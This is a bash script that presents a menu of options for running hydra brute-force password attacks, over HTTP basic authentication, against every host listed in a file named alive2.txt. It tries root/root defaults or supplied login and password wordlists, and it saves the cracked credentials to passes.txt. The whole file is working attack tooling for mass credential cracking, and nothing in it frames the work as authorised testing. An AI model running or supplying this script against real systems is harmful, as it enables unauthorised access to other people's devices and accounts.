#!/bin/bash



PS3='Please enter your choice: '
options=("Crack with default pass/login" "Crack with wordlist (for pass/login)" "Crack with wordlist for only pass" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Crack with default pass/login")
		while read p; do
  		echo $p
		hydra -F -t 6 -o passes.txt -l root -p root -vV $p http-get / 
		done <alive2.txt
            ;;
        "Crack with wordlist (for pass/login)")
            echo "Put wordlist for password in this folder and type name ex.(wordlistforpass.txt)"
	    read wordpass
	    echo "Put wordlist for login in this folder and type name ex.(wordlistforlogin.txt)"
	    read wordlogin
	    while read p; do
  		echo $p
		hydra -F -t 6 -o passes.txt -L $wordlogin -P $wordpass -vV $p http-get / 
		done <alive2.txt
            ;;
        "Crack with wordlist for only pass")
            echo "Put wordlist for pass in this folder and type name ex.(wordlistforpass.txt)"
	    read wordpass
		while read p; do
  		echo $p
		hydra -F -t 6 -o passes.txt -l root -P $wordpass -vV $p http-get / 
		done <alive2.txt
            ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done

